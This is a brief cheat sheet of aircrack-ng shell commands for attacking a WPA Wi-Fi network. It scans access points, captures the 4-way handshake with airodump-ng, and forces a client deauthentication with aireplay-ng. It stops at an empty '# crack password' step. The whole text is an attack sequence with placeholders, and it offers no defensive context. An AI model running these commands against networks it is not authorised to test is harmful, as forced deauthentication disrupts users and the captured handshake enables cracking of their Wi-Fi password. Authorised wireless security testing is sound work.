# to prevent problems
ifconfig <monitor mode wifi adapter> down

# get bssids
airodump-ng -a -w <pcap file> <monitor mode wifi adapter>

# get 4way handshake
airodump-ng -c 1 --bssid <bssid> -w <pcap file> <monitor mode adapter>

# force deauth
aireplay-ng -0 1 -a <bssid - MAC address of access point> -c <dmac - MAC address of destination> <monitor mode adapter>

# crack password
